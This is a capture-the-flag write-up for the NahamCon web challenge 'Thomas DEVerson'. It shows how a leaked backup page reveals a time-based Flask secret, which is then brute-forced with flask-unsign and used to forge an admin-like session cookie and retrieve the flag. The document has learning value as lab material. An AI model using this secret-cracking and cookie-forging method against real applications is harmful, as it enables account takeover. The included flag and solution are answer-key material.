# Challenge Name: Thomas DEVerson


![date](https://img.shields.io/badge/date-23.05.2024-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![value](https://img.shields.io/badge/value-175-blue.svg)  

## Description

Author: @Jstith  
  
All things considered, I'm impressed this website is still up and running 200 years later.  
  
## Detailed solution

![Pasted image 20240525232509](https://github.com/BaadMaro/CTF/assets/72421091/f452f6c5-cfa2-4f21-b0e5-69358adcd8e4)

Start checking the pages. I found a comment on the Messages page view-source:http://challenge.nahamcon.com:32723/messages

```html
<!-- <a href="/backup" class="pl-md-0 p-3 text-white">Backup</a> !-->
```

http://challenge.nahamcon.com:32723/backup

![Pasted image 20240525232639](https://github.com/BaadMaro/CTF/assets/72421091/ca88130f-7376-4769-b8f8-1de85ba0d6b8)

We have a part of the app.py (10 lines) 

We can clearly see the app secret used for flask cookie management and also users.

The secret key is linked to the date time of app start, which is available at http://challenge.nahamcon.com:32723/status

The cookie used was `eyJuYW1lIjoiZ3Vlc3QifQ.ZlJnJQ.v6T-LeB_sG7QtOz-9nts1T9-jyA` which has the part {"name":"guest"} (using base64 decode).

Now we need to get the exact time used for secret key to forge our cookie using one of the allowed users

Getting the date http://challenge.nahamcon.com:32723/status

```
System healthy! Computing uptime... 82816 days 12 hours 41 minutes
```

```python
from datetime import datetime, timedelta

# Get the current date and time
now = datetime.now()

# Define the duration to subtract
days = 82816
hours = 12
minutes = 41

# Create a timedelta object for the duration
duration = timedelta(days=days, hours=hours, minutes=minutes)

# Calculate the past date and time
past_date = now - duration

# Print the result
print("past_date)
```

I got 1797-08-25. I ignored the hour and minutes to try to find them accurately.

```python
for hour in range(24):
    for minute in range(60):
        print(f"THE_REYNOLDS_PAMPHLET-17970825{hour:02}{minute:02}")
```

I saved the output in secrets.txt and started the cracking process using `flask-unsign`

```
flask-unsign -c "eyJuYW1lIjoiZ3Vlc3QifQ.Zk-uig.mX9ksf-4ohQQjnA3I6m2OlENt4Y" --wordlist secrets.txt -u --no-literal-eval

[*] Session decodes to: {'name': 'guest'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 640 attemptsLET-17970825
b'THE_REYNOLDS_PAMPHLET-179708250845'

```

We got the secret key `THE_REYNOLDS_PAMPHLET-179708250845`

Now let's generate our cookie

```
flask-unsign -c "{'name': 'Jefferson'}" --secret "THE_REYNOLDS_PAMPHLET-179708250845" --sign

eyJuYW1lIjoiSmVmZmVyc29uIn0.Zk-3WQ.WCy1txbI_4wuGzruToNF7FY14YQ
```

We need to change the cookie in devtools and check messages page

![Pasted image 20240525234745](https://github.com/BaadMaro/CTF/assets/72421091/56136246-ffd9-43d2-963f-4fd0fdf1588a)

## Flag

```
flag{f69f2c087b291b9da9c9fe9219ee130f}
```
